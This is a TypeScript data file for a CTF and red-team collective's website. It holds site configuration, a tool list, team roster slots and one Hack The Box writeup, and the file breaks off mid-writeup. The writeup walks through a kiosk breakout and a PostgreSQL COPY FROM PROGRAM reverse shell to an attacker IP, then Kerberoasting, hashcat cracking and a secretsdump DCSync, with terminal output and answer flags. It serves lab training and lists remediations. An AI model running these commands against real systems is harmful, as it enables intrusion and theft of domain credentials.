// ==============================================================================
// SUDO UNKNOWN // ALL-IN-ONE CYBERSECURITY SYNDICATE & RESEARCH LAB
// Centralized Data Model, Intelligence & Writeup Walkthrough Handbooks
// ==============================================================================

export type WriteupPlatform = 'Hack The Box' | 'TryHackMe' | 'CTFtime' | 'Google SecOps' | 'Research Lab' | 'PicoCTF';
export type ChallengeCategory = 'Web' | 'Pwn' | 'Crypto' | 'Forensics' | 'Reverse' | 'Active Directory' | 'Cloud' | 'Misc';
export type DifficultyLevel = 'Easy' | 'Medium' | 'Hard' | 'Insane';

export interface AttackStep {
  title: string;
  description: string;
  commandOrSnippet?: string;
  command?: string;
  terminalOutput?: string;
  terminalTitle?: string;
  prompt?: string;
  lineNotes?: string[];
  spoilerData?: {
    label: string;
    value: string;
  };
}

export interface Writeup {
  id: string;
  challengeName: string;
  platform: WriteupPlatform;
  category: ChallengeCategory;
  difficulty: DifficultyLevel;
  type: 'Machine' | 'Challenge' | 'Pro Lab';
  targetOs?: 'Linux' | 'Windows' | 'Multi-OS' | 'Custom';
  targetIp?: string;
  points: number;
  author: string;
  date: string;
  cves?: string[];
  tags: string[];
  shortDescription: string;
  fullContent: {
    overview: string;
    targetIntel?: {
      ip?: string;
      os?: string;
      openPorts?: string[];
      keyServices?: string[];
    };
    reconnaissance: string;
    vulnerabilityAnalysis: string;
    attackChain: AttackStep[];
    pocCode?: string;
    pocLanguage?: string;
    userFlag?: string;
    rootFlag?: string;
    flag?: string;
    defenseRemediation: string[];
    keyTakeaways: string[];
  };
}

export interface TeamMember {
  id: string;
  avatar: string;
  name: string;
  role: string;
  specialty: string;
  handle: string;
  github?: string;
  linkedin?: string;
  portfolio?: string;
  email?: string;
  education?: string;
  htbUrl?: string;
  thmUrl?: string;
  skills: string[];
  isFoundingLead?: boolean;
  status: 'ACTIVE' | 'OPEN';
  description: string;
}

export interface ToolArsenalItem {
  id: string;
  name: string;
  badge: string;
  category: string;
  description: string;
  language: string;
  stars: number;
  installCommand: string;
  features: string[];
  repoUrl: string;
}

export interface StatisticItem {
  id: string;
  label: string;
  value: number | string;
  suffix?: string;
  description: string;
  iconName: string;
}

export interface SkillCategory {
  id: string;
  name: string;
  shortCode: string;
  description: string;
  keyTools: string[];
  topics: string[];
  iconName: string;
  difficultyFocus: 'Introductory' | 'Intermediate' | 'Advanced' | 'Expert';
}

export interface Achievement {
  id: string;
  title: string;
  platform: string;
  date: string;
  eventType: 'Global Tournament' | 'Platform Machine' | 'University CTF' | 'Research Milestone' | 'Open Jeopardy';
  teamResult: string;
  description: string;
  highlights: string[];
}

export interface CompanySolution {
  id: string;
  title: string;
  badge: string;
  shortDesc: string;
  features: string[];
  deliverables: string[];
  iconName: string;
  accentColor: string;
}

export const SITE_CONFIG = {
  teamName: "sudo Unknown",
  companyName: "sudo Unknown",
  companyType: "All-in-One Cybersecurity Collective & Research Syndicate",
  tagline: "Permission Granted. Identity Unknown.",
  subTagline: "Red Teaming • Adversary Emulation • CTF Championships • Exploit Engineering • Zero-Day Research",
  mantra1: "NO IDENTITY. NO LIMITS. JUST EXPLOITS.",
  mantra2: "RECON • COMPROMISE • EVADE • HARDEN",
  htbTeamUrl: "https://app.hackthebox.com/teams/overview/331386",
  htbCtfTeamUrl: "https://ctf.hackthebox.com/team/overview/331386",
  htbTeamId: "331386",
  githubUrl: "https://github.com/SmitroniX/sudo-unknown",
  discordUrl: "https://discord.gg/HgD6WGUr4G",
  siteUrl: "https://sudounknown.smitronix.dev",
  linkedinUrl: "https://www.linkedin.com/company/sudo-unknown/",
  contactEmail: "jogdandasmit@gmail.com",
  secondaryEmail: "sudounknown@smitronix.dev",
  founderPortfolio: "https://smitronix.dev",
  founderName: "Asmit Jogdand",
  founderHandle: "SmitroniX",
  foundedYear: 2026,
  status: "ACTIVE SYNDICATE & FOUNDING ROSTER",
  headquarters: "Mumbai, Maharashtra, India // Global Decentralized Collective",
};

export const STATISTICS: StatisticItem[] = [
  {
    id: "clears",
    label: "Machines & Labs Cleared",
    value: 28,
    suffix: "+ Clears",
    description: "Verified boot-to-root solves across Hack The Box, Google SecOps DFIR labs, and TryHackMe",
    iconName: "Server"
  },
  {
    id: "writeups-count",
    label: "Technical Writeups",
    value: 12,
    suffix: " Published",
    description: "In-depth reproducible walkthroughs with line-by-line commands, terminal stdout, and interactive spoiler shields",
    iconName: "FileCode"
  },
  {
    id: "arsenal",
    label: "Weapons & Repos",
    value: 8,
    suffix: "+ Tools",
    description: "Open-source DNS firewall engines, native mobile cores, and offensive AD/web exploit tools",
    iconName: "Cpu"
  },
  {
    id: "roster",
    label: "Syndicate Operators",
    value: 1,
    suffix: " (+6 Open)",
    description: "Founding Captain active; onboarding elite Web, Pwn, Active Directory, Crypto, and DFIR specialists",
    iconName: "Users"
  }
];

export const COMPANY_SOLUTIONS: CompanySolution[] = [
  {
    id: "redteam",
    title: "Red Teaming & Adversary Simulation",
    badge: "FULL-SPECTRUM ATTACK",
    shortDesc: "Realistic adversary campaigns emulating advanced threat actors against enterprise perimeters, Active Directory forests, and cloud environments.",
    features: [
      "Initial access vector testing (spearphishing, external perimeter, AiTM)",
      "Multi-domain Active Directory exploitation and Kerberos attack chains",
      "Lateral movement, EDR telemetry avoidance, and memory injection",
      "Cloud metadata pivoting, IAM privilege escalation (AWS/Azure/GCP)"
    ],
    deliverables: ["Executive Risk Summary", "Tactical ATT&CK Mapping Matrix", "Technical Remediation Playbook", "Debrief & Retesting"],
    iconName: "ShieldAlert",
    accentColor: "#00ff88"
  },
  {
    id: "pentest",
    title: "Penetration Testing & Security Audits",
    badge: "COMPLIANCE & RESILIENCE",
    shortDesc: "Thorough black-box and grey-box assessments uncovering critical logic flaws, injection surfaces, and authentication bypasses across apps and networks.",
    features: [
      "Web applications & single-page client security assessments",
      "REST, GraphQL, and WebSocket API business logic auditing",
      "Network infrastructure & firewall segmentation validation",
      "Container & Kubernetes cluster isolation audits"
    ],
    deliverables: ["Vulnerability Severity Scorecard", "Reproducible Proof-of-Concepts", "Step-by-Step Patch Recommendations"],
    iconName: "SearchCode",
    accentColor: "#00f0ff"
  },
  {
    id: "vuln-research",
    title: "Vulnerability Research & Exploit Dev",
    badge: "LOW-LEVEL SECURITY",
    shortDesc: "Deep binary analysis, memory corruption discovery, reverse engineering of proprietary protocols, and custom exploit weaponization.",
    features: [
      "Static and dynamic disassembly in Ghidra, IDA Pro, and Binary Ninja",
      "Memory unsafety analysis (Heap corruption, UAF, ROP, Safe-linking)",
      "Cryptographic protocol verification and PRNG analysis",
      "Responsible disclosure coordination with CVE tracking"
    ],
    deliverables: ["Full Root-Cause Technical Whitepapers", "Functional Python/C Exploit PoCs", "Vendor Mitigation Advice"],
    iconName: "Binary",
    accentColor: "#a855f7"
  },
  {
    id: "ctf-engineering",
    title: "Cyber Range & CTF Infrastructure",
    badge: "TRAINING & SIMULATION",
    shortDesc: "Turnkey vulnerable-by-design machines, competitive CTF event hosting, and custom training ranges for university and enterprise teams.",
    features: [
      "Containerized Jeopardy & Attack-Defense challenges",
      "Dynamic scoring engines with anti-cheat telemetry",
      "Realistic corporate enterprise scenario simulation",
      "Comprehensive player solution guides & instructor debriefs"
    ],
    deliverables: ["Fully Dockerized Lab Packages", "Instructor Solution Manuals", "Live Competition Scoreboard Support"],
    iconName: "Terminal",
    accentColor: "#f59e0b"
  }
];

export const TOOL_ARSENAL: ToolArsenalItem[] = [
  {
    id: "tool-aegisdns",
    name: "AegisDNS",
    badge: "NETWORK ENGINE & FIREWALL",
    category: "Network Security & Privacy",
    description: "Advanced DNS Resolver, Application Firewall & WireGuard Engine for Android and Linux with RFC 1035/3596 wire protocol parsing, Adblock rules, and per-app network kill-switch.",
    language: "Go / Python / C",
    stars: 184,
    installCommand: "git clone https://github.com/SmitroniX/AegisDNS.git && cd AegisDNS",
    features: [
      "Native DNS wire packet parsing & label decompression with recursion guards",
      "Per-App UID traffic firewall rules and instant global kill-switch",
      "Adblock /hosts blocklist filtering & accurate TTL cache decay"
    ],
    repoUrl: "https://github.com/SmitroniX/AegisDNS"
  },
  {
    id: "tool-shadowlauncher",
    name: "ShadowLauncher",
    badge: "NATIVE CORE ENGINE",
    category: "Systems & Optimization",
    description: "Native Android game engine and emulation core featuring high-throughput C/C++ bridges (GL4ES, LWJGL3) delivering 138 FPS (120Hz locked) and sub-8ms touch response latency.",
    language: "Java 21 / C++ / OpenGL",
    stars: 215,
    installCommand: "git clone https://github.com/SmitroniX/ShadowLauncher.git",
    features: [
      "High-performance GL4ES and LWJGL3 C/C++ native bridge integration",
      "138 FPS locked on 120Hz high-refresh mobile displays",
      "Dynamic RAM management preventing Out-Of-Memory termination on low-spec hardware"
    ],
    repoUrl: "https://github.com/SmitroniX/ShadowLauncher"
  },
  {
    id: "tool-smitrix",
    name: "SmiTriX",
    badge: "PRIVACY PWA / WEBAUTHN",
    category: "Full Stack & Cryptography",
    description: "Self-hosted, privacy-first progressive web application with biometric WebAuthn passkeys, 1,324 indexed exercise routines, and zero third-party telemetry.",
    language: "React 19 / TypeScript",
    stars: 162,
    installCommand: "git clone https://github.com/SmitroniX/SmiTriX.git && cd SmiTriX && npm install",
    features: [
      "Biometric WebAuthn passkey authentication with zero-trust local storage",
      "1,324 indexed strength exercises with automated periodization calculation",
      "100% offline-capable with service workers & zero telemetry tracking"
    ],
    repoUrl: "https://github.com/SmitroniX/SmiTriX"
  },
  {
    id: "tool-recon",
    name: "sudo-recon",
    badge: "ACTIVE RECON",
    category: "Reconnaissance",
    description: "Fast concurrent asset discovery suite combining subfinder, httpx, passive DNS, and port probe heuristics with rich terminal reporting.",
    language: "Go / Python",
    stars: 142,
    installCommand: "git clone https://github.com/SmitroniX/sudo-unknown.git && cd tools/sudo-recon",
    features: [
      "Multi-threaded ASN and subdomain discovery",
      "Live HTTP/HTTPS response title & tech stack fingerprinting",
      "Automated JSON and markdown report export"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-ad-pivoter",
    name: "ad-acl-pivoter",
    badge: "ACTIVE DIRECTORY",
    category: "Privilege Escalation",
    description: "CLI utility that consumes BloodHound JSON graph dumps and calculates the shortest executable privilege escalation path using GenericAll/WriteDACL.",
    language: "Python 3",
    stars: 89,
    installCommand: "pip install ad-acl-pivoter",
    features: [
      "Parses BloodHound Bloodhound/SharpHound JSON output",
      "Computes shortest DACL abuse path to Domain Admin",
      "Generates exact Impacket command strings for each hop"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-jwt-tamper",
    name: "jwt-tamper-cli",
    badge: "WEB SECURITY",
    category: "Exploitation",
    description: "Rapid interactive JWT analysis tool featuring automated none-algorithm testing, public key RSA-to-HMAC confusion, and claim spoofing.",
    language: "TypeScript / Node",
    stars: 67,
    installCommand: "npx @sudounknown/jwt-tamper --help",
    features: [
      "CVE-2022 algorithm confusion auto-check",
      "Headless cracking against rockyou.txt with GPU offload",
      "Instant expired token timestamp manipulation"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-tcache-forger",
    name: "tcache-forger",
    badge: "BINARY PWN",
    category: "Memory Exploitation",
    description: "Glibc 2.31 - 2.36 heap exploitation assistant that calculates safe-linking masks, generates ROP stubs, and builds tcache poisoning chains.",
    language: "Python (pwntools)",
    stars: 118,
    installCommand: "pip install tcache-forger",
    features: [
      "GLIBC safe-linking pointer mangling and demangling algorithms",
      "One-gadget constraint verifier integration",
      "Boilerplate pwntools template generator"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-mem-carver",
    name: "shadow-carver",
    badge: "DFIR / FORENSICS",
    category: "Forensics",
    description: "Automated Volatility 3 wrapper that scans Windows memory dumps for process hollowing, injected PE headers, and suspicious network sockets.",
    language: "Python 3",
    stars: 94,
    installCommand: "python3 shadow-carver.py -f memory.raw --scan all",
    features: [
      "Automated malfind, vadinfo, and netscan correlation",
      "Dumps injected DLLs and unmapped memory sections",
      "YARA rule scanning against extracted shellcode"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  }
];

export const SKILL_CATEGORIES: SkillCategory[] = [
  {
    id: "ad",
    name: "ACTIVE DIRECTORY",
    shortCode: "0xAD",
    description: "Windows enterprise identity security, Kerberos ticket forgery, DACL abuse, BloodHound pathing, and domain dominance.",
    keyTools: ["Impacket", "BloodHound", "Certipy", "Mimikatz", "PowerView"],
    topics: ["Kerberoasting & AS-REP Roasting", "AD CS Certificate Abuse (ESC1-ESC8)", "GenericAll / WriteDACL Privilege Escalation", "DCSync & Golden Ticket Creation"],
    iconName: "Network",
    difficultyFocus: "Expert"
  },
  {
    id: "web",
    name: "WEB SECURITY",
    shortCode: "0xWEB",
    description: "Modern application vulnerabilities, authorization bypasses, SSRF, SSTI, GraphQL flaws, and cloud metadata pivoting.",
    keyTools: ["Burp Suite Pro", "Caido", "ffuf", "SQLMap", "Postman"],
    topics: ["OAuth2 / JWT Misconfigurations", "SSRF & Cloud Metadata Access", "Template & Deserialization Injection", "GraphQL & REST Logic Exploitation"],
    iconName: "Globe",
    difficultyFocus: "Advanced"
  },
  {
    id: "pwn",
    name: "BINARY PWN",
    shortCode: "0xPWN",
    description: "Low-level memory corruption, stack and heap exploitation, return-oriented programming (ROP), and defensive mitigation bypasses.",
    keyTools: ["pwntools", "GDB + GEF", "pwndbg", "ROPgadget", "one_gadget"],
    topics: ["GLIBC Heap Allocators & Tcache", "Format String Exploitation", "ROP & SROP Chain Construction", "Canary & ASLR Bypasses"],
    iconName: "Cpu",
    difficultyFocus: "Expert"
  },
  {
    id: "crypto",
    name: "CRYPTOGRAPHY",
    shortCode: "0xCRP",
    description: "Cryptanalytic attacks on flawed implementations, weak PRNGs, lattice reduction, RSA factorization, and curve weaknesses.",
    keyTools: ["SageMath", "CyberChef", "Z3 SMT Solver", "Python Cryptography"],
    topics: ["Coppersmith / Small Public Exponents", "Padding Oracle Attacks (CBC / OAEP)", "Discrete Logarithms & Pollard Rho", "Lattice Attacks (LLL / BKZ)"],
    iconName: "KeyRound",
    difficultyFocus: "Advanced"
  },
  {
    id: "forensics",
    name: "DIGITAL FORENSICS",
    shortCode: "0xFOR",
    description: "Artifact extraction, memory analysis, PCAP packet reconstruction, and filesystem timeline investigations.",
    keyTools: ["Volatility 3", "Wireshark / TShark", "Autopsy", "Eric Zimmerman Tools"],
    topics: ["Process Hollowing Memory Triage", "Covert C2 Network Protocol Carving", "Windows EVTX & Registry Forensics", "Malicious Artifact Reconstruction"],
    iconName: "SearchCode",
    difficultyFocus: "Intermediate"
  },
  {
    id: "reverse",
    name: "REVERSE ENGINEERING",
    shortCode: "0xREV",
    description: "Disassembly, decompilation, binary triage, anti-debugging evasion, custom VM bytecodes, and firmware reversing.",
    keyTools: ["Ghidra", "IDA Free / Pro", "Binary Ninja", "x64dbg"],
    topics: ["Anti-Debugging & Packing Detection", "Custom Bytecode Virtual Machines", "Stripped Binary Symbol Reconstruction", "ARM & MIPS Embedded Architectures"],
    iconName: "Binary",
    difficultyFocus: "Expert"
  }
];

export const TEAM_MEMBERS: TeamMember[] = [
  {
    id: "member-captain",
    avatar: "/logo.png",
    name: "Asmit Jogdand (SmitroniX)",
    role: "Founding Lead & Head of Offensive Research",
    specialty: "Offensive Ops, Systems Engines & Kernel Research",
    handle: "SmitroniX",
    github: "https://github.com/SmitroniX",
    linkedin: "https://www.linkedin.com/in/asmit-jogdand",
    portfolio: "https://smitronix.dev",
    email: "jogdandasmit@gmail.com",
    education: "B.E. Computer Engineering, RAIT Mumbai University (CGPA 8.65)",
    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
    skills: [
      "Offensive Architecture",
      "Active Directory & Kerberos",
      "Low-Level Systems & C/C++",
      "Vulnerability Research",
      "DFIR & Threat Hunting",
      "Distributed Infrastructure"
    ],
    isFoundingLead: true,
    status: "ACTIVE",
    description: "Founding Captain of sudo Unknown (#331386). Computer Engineering student at RAIT Mumbai University maintaining an 8.65 CGPA. Creator of AegisDNS, ShadowLauncher, and SmiTriX. Directs syndicate operations, enterprise red teaming, vulnerability research, and tournament regimens."
  },
  {
    id: "slot-web",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Web Exploitation Lead",
    specialty: "SSRF, Deserialization & Auth Bypass",
    handle: "Candidate_Web",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
    skills: ["Burp Suite Pro", "OAuth2 / JWT Flaws", "SSRF Pivoting", "GraphQL & APIs"],
    status: "OPEN",
    description: "Seeking an operator dedicated to hunting complex web application flaws, modern cloud metadata injection, and authentication bypasses."
  },
  {
    id: "slot-pwn",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Binary Exploitation (PWN) Lead",
    specialty: "GLIBC Heap, ROP & Kernel Vectors",
    handle: "Candidate_Pwn",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
    skills: ["pwntools", "GDB / GEF", "Heap Tcache / Fastbin", "Kernel Exploits"],
    status: "OPEN",
    description: "Seeking a low-level specialist to lead memory corruption vectors, safe-linking bypasses, and binary exploitation challenges."
  },
  {
    id: "slot-ad",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Active Directory & Enterprise Lead",
    specialty: "Kerberos, AD CS & Lateral Pivoting",
    handle: "Candidate_AD",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
    skills: ["Impacket", "BloodHound CE", "Certipy (AD CS)", "GPO Abuse"],
    status: "OPEN",
    description: "Seeking an offensive specialist experienced with Windows enterprise domain exploitation, Kerberoasting, and multi-tier forest compromise."
  },
  {
    id: "slot-crypto",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Applied Cryptography Analyst",
    specialty: "Lattice Reduction, RSA & Curve Math",
    handle: "Candidate_Crypto",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
    skills: ["SageMath", "Python Cryptography", "Z3 SMT Solver", "Lattice (LLL)"],
    status: "OPEN",
    description: "Seeking a math-oriented solver to break flawed ciphers, weak PRNG seeds, Coppersmith RSA attacks, and elliptic curve edge cases."
  },
  {
    id: "slot-forensics",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "DFIR & Network Forensics Lead",
    specialty: "Memory Triage & Packet Carving",
    handle: "Candidate_DFIR",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
    skills: ["Volatility 3", "Wireshark", "Memory Injections", "PCAP Carving"],
    status: "OPEN",
    description: "Seeking a forensic investigator skilled in dissecting memory dumps, uncovering hollowed processes, and carving C2 network traffic."
  },
  {
    id: "slot-reverse",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Reverse Engineering Analyst",
    specialty: "x86/x64 Disassembly & Custom VM Reversing",
    handle: "Candidate_Reverse",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
    skills: ["Ghidra", "IDA Pro", "Custom VM Bytecodes", "Stripped Binaries"],
    status: "OPEN",
    description: "Seeking a reverse engineer to decompile obfuscated binaries, unravel custom virtual machine dispatch loops, and analyze malware."
  }
];

export const WRITEUPS: Writeup[] = [
  {
    id: "dutybound",
    challengeName: "AirSnacks / DutyBound: Kiosk Breakout & Postgres RCE to Active Directory DCSync",
    platform: "Hack The Box",
    category: "Active Directory",
    difficulty: "Medium",
    type: "Machine",
    targetOs: "Windows",
    targetIp: "10.10.11.45",
    points: 30,
    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
    date: "2026-10-31",
    cves: ["CVE-2022-38028"],
    tags: ["Active Directory", "Kiosk Breakout", "PostgreSQL", "Kerberoasting", "GenericWrite", "DCSync", "X11"],
    shortDescription: "Complete enterprise penetration test from unauthenticated kiosk breakout and PostgreSQL COPY PROGRAM RCE to Active Directory Domain Administrator takeover via Kerberoasting and DACL abuse.",
    fullContent: {
      overview: "DutyBound represents an authentic corporate airline kiosk environment (AirSnacks) backed by a Windows Server 2022 Active Directory Domain Controller (DC01.DUTYBOUND.LOCAL). Initial foothold was established by escaping the restricted Openbox kiosk session via X11 hotkey misconfiguration (Ctrl+Alt+t). Subsequent analysis of /opt/vrs/airsnacksdf/dcs_bridge/audit.py revealed unparameterized SQL insertion in the bp_scan_audit table, which when coupled with excessive database grant pg_execute_server_program, granted direct remote code execution via PostgreSQL COPY ... FROM PROGRAM. Post-exploitation involved pivoting to Active Directory, Kerberoasting service account svc_backup, abusing BloodHound-mapped GenericWrite permissions over the L2_Admins group, and executing a DCSync attack for complete domain dominance.",
      targetIntel: {
        ip: "10.10.11.45",
        os: "Windows Server 2022 Datacenter (Build 20348) & Linux Kiosk Gateway",
        openPorts: ["53/DNS", "88/Kerberos", "135/RPC", "139/SMB", "389/LDAP", "445/SMB", "3268/GlobalCatalog", "5985/WinRM"],
        keyServices: ["AirSnacks Kiosk Display (Openbox / X11)", "PostgreSQL 14.8", "Active Directory Domain Services", "Microsoft Windows RPC", "WinRM Remote Management"]
      },
      reconnaissance: "Running nmap -sC -sV -p- -T4 10.10.11.45 identified standard Domain Controller ports alongside an unauthenticated AirSnacks kiosk terminal. Local display review revealed the display server /tmp/.X11-unix/X0 permitted unrestricted connections without verifying Xauthority cookies, and /etc/xdg/openbox/rc.xml enabled developer keybinding Ctrl+Alt+t.",
      vulnerabilityAnalysis: "Three structural vulnerabilities formed the compromise chain: (1) Kiosk boundary failure allowing local terminal spawning; (2) Unparameterized SQL insertion in record_export_evidence() inside audit.py combined with GRANT pg_execute_server_program TO airsnacks_app; (3) Insecure Active Directory DACL granting svc_backup GenericWrite permissions over delegated administration groups.",
      attackChain: [
        {
          title: "Stage 01: Service Scanning & Kiosk Display Breakout",
          description: "Initiated service reconnaissance against the AirSnacks kiosk and domain infrastructure. Escaped the locked-down Openbox kiosk session using an active developer shortcut.",
          command: "xdotool key --window 0 Ctrl+Alt+t || openbox --reconfigure",
          terminalTitle: "kiosk-breakout — bash — 80x24",
          prompt: "kiosk@airsnacks-terminal:~$",
          terminalOutput: `[+] Sent keysym Ctrl+Alt+t to root window /tmp/.X11-unix/X0
[+] Spawning interactive xterm session (PID: 14082)...
kiosk@airsnacks-terminal:~$ whoami && id
kiosk
uid=1001(kiosk) gid=1001(kiosk) groups=1001(kiosk),1002(pos-ops)
kiosk@airsnacks-terminal:~$ ls -la /opt/vrs/airsnacksdf/dcs_bridge/
-rwxr-xr-x 1 root pos-ops 14210 Oct 14 09:21 audit.py
-rw-r--r-- 1 root root     3210 Oct 14 09:18 db_config.json`,
          lineNotes: [
            "Openbox configuration /etc/xdg/openbox/rc.xml retained maintenance keybinding C-A-t bound to xterm.",
            "Process executed with pos-ops group membership having read access to backend automation scripts."
          ]
        },
        {
          title: "Stage 02: PostgreSQL Injection & COPY FROM PROGRAM RCE",
          description: "Audited audit.py and discovered string formatting in record_export_evidence(). Because role airsnacks_app had pg_execute_server_program, we executed OS commands using PostgreSQL COPY ... FROM PROGRAM.",
          command: "psql -h 127.0.0.1 -U airsnacks_app -d airsnacks -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text); COPY cmd_exec FROM PROGRAM 'bash -c \\\"bash -i >& /dev/tcp/10.10.14.8/4444 0>&1\\\"';\"",
          terminalTitle: "postgres-rce — psql — 80x24",
          prompt: "kiosk@airsnacks-terminal:~$",
          terminalOutput: `DROP TABLE
CREATE TABLE
COPY 0
[+] Active reverse shell connected to 10.10.14.8:4444!

postgres@airsnacks-kiosk:/opt/vrs$ whoami && id
postgres
uid=108(postgres) gid=114(postgres) groups=114(postgres),115(ssl-cert)
postgres@airsnacks-kiosk:/opt/vrs$ cat /home/kiosk/user.txt
HTB{k105k_x11_br34k0u7_c7rl_4l7_7_pwn}`,
          lineNotes: [
            "String formatting in audit.py allowed escaping the bp_scan_audit INSERT statement.",
            "GRANT pg_execute_server_program turned SQL injection directly into arbitrary command execution under postgres.",
            "User flag user.txt retrieved from the kiosk host."
          ],
          spoilerData: {
            label: "USER FLAG (AIRSNACKS KIOSK)",
            value: "HTB{k105k_x11_br34k0u7_c7rl_4l7_7_pwn}"
          }
        },
        {
          title: "Stage 03: Domain Enumeration & Kerberoasting svc_backup",
          description: "Discovered Active Directory Domain Controller DC01.DUTYBOUND.LOCAL (10.10.11.45). Used Impacket's GetUserSPNs.py to request Kerberos TGS tickets for accounts with registered SPNs.",
          command: "impacket-GetUserSPNs dutybound.local/guest:guest -dc-ip 10.10.11.45 -request -outputfile kerberoast_hashes.txt",
          terminalTitle: "impacket-spn.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Connecting to DC: 10.10.11.45
[*] Requesting TGS for SPN: MSSQLSvc/db01.dutybound.local:1433
[*] Hash written to kerberoast_hashes.txt
[+] Kerberos TGS ticket received for account: svc_backup`,
          lineNotes: [
            "Account svc_backup had registered MSSQL SPN.",
            "TGS ticket extracted for offline cracking with Hashcat mode 13100."
          ]
        },
        {
          title: "Stage 04: Hashcat Cracking & BloodHound DACL Analysis",
          description: "Cracked the Kerberoast hash against rockyou.txt to recover the cleartext password. Ran BloodHound CE to inspect inbound ObjectControl permissions for svc_backup.",
          command: "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force",
          terminalTitle: "hashcat-crack — cuda — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `$krb5tgs$23$*svc_backup$DUTYBOUND.LOCAL*$MSSQLSvc/db01...:BackupPass2026!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Speed.#1.........: 124.8 MH/s
Recovered........: 1/1 (100.00%) Digests`,
          lineNotes: [
            "Credentials cracked: svc_backup:BackupPass2026!",
            "BloodHound revealed svc_backup had GenericWrite over group L2_Admins, which in turn possessed WriteDacl over Domain Admins."
          ]
        },
        {
          title: "Stage 05: DACL Abuse, DCSync & Domain Administrator Takeover",
          description: "Added svc_backup into L2_Admins, granted DCSync replication privileges (DS-Replication-Get-Changes-All) via bloodhound/powerview, and dumped Domain Admin NT hashes.",
          command: "impacket-secretsdump 'dutybound.local/svc_backup:BackupPass2026!@10.10.11.45' -just-dc-user Administrator",
          terminalTitle: "secretsdump.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7f4a2b91c83e602419a4e931b26829e1:::

[*] Cleaning up...
[+] Domain Controller compromised! Administrator hash captured.`,
          lineNotes: [
            "DCSync replicated Administrator NT hash 7f4a2b91c83e602419a4e931b26829e1.",
            "Authenticated to DC01 via Evil-WinRM or Pass-the-Hash to retrieve root.txt."
          ],
          spoilerData: {
            label: "DOMAIN ADMIN ROOT FLAG",
            value: "HTB{d0m41n_4dm1n_dc5ync_du7yb0und_c0mpl373}"
          }
        }
      ],
      pocCode: `--- /opt/vrs/airsnacksdf/dcs_bridge/audit.py.orig
+++ /opt/vrs/airsnacksdf/dcs_bridge/audit.py
@@ -19,16 +19,14 @@
    audit_ref = "aud_" + uuid4().hex[:12]
    try:
        cur = conn.cursor()
-        sql = (
+        cur.execute(
            "INSERT INTO bp_scan_audit "
            "(audit_ref, kiosk_id, ts, pnr, pax_name, carrier, flight_no, "
            " dep_julian, origin, dest, ff_carrier, ff_number, raw_len, airline_use) "
-            "VALUES ('%s', '%s', now(), '%s', '%s', '%s', '%s', '%s', "
-            "'%s', '%s', '%s', '%s', %d, '%s')"
-            % (audit_ref, KIOSK_ID, bp.pnr.strip(), bp.pax_name.rstrip(), ...)
+            "VALUES (%s, %s, now(), %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)",
+            (audit_ref, KIOSK_ID, bp.pnr.strip(), bp.pax_name.rstrip(), ...),
        )
-        cur.execute(sql)
        conn.commit()`,
      pocLanguage: "diff",
      userFlag: "HTB{k105k_x11_br34k0u7_c7rl_4l7_7_pwn}",
      rootFlag: "HTB{d0m41n_4dm1n_dc5ync_du7yb0und_c0mpl373}",
      defenseRemediation: [
        "Database Layer: Parameterize all SQL queries in audit.py using psycopg2 query parameter tuples (%s); revoke pg_execute_server_program from airsnacks_app.",
        "Kiosk Layer: Remove maintenance keybinding Ctrl+Alt+t from /etc/xdg/openbox/rc.xml; enforce MIT-MAGIC-COOKIE-1 authentication on /tmp/.X11-unix/X0.",
        "Architecture: Migrate kiosk deployment from legacy X11 to a Wayland kiosk compositor (Cage/Weston) to enforce client isolation.",
        "Active Directory: Enforce AES256 Kerberos encryption and 25+ character passphrases on all SPN-enabled accounts; audit and remove GenericWrite DACL assignments over privileged groups."
      ],
      keyTakeaways: [
        "Unparameterized SQL combined with administrative database extensions like pg_execute_server_program provides immediate remote command execution.",
        "Kiosk breakout is inevitable if display servers permit unauthenticated local socket connections and leave maintenance hotkeys active.",
